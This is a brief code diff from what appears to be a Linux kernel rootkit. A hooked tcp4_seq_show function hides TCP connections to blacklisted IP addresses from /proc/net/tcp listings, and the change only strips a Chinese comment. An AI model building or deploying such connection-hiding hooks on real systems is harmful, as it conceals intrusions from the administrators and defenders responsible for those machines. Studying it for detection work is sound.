@@ -25,7 +25,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 
         for (i = 0; i < ARRAY_SIZE(blacklist_ips); i++) {
             if (is->inet_daddr == blacklist_ips[i]) {
-                return 0;  // 命中黑名单，直接返回
+                return 0;
             }
         }
     }
